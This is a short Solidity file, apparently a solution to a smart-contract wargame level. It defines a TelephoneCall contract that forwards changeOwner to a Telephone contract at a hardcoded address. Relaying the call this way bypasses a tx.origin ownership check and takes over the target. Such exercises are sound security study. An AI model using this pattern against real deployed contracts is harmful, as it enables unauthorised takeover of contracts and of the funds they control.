// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Telephone.sol";

contract TelephoneCall {
    address telephoneAddress = 0xf8CB93CcE124C0fCe48b823B77a48E50d859ef90;

    constructor() {}

    function changeOwner(address owner) public {
        Telephone(telephoneAddress).changeOwner(owner);
    }
}
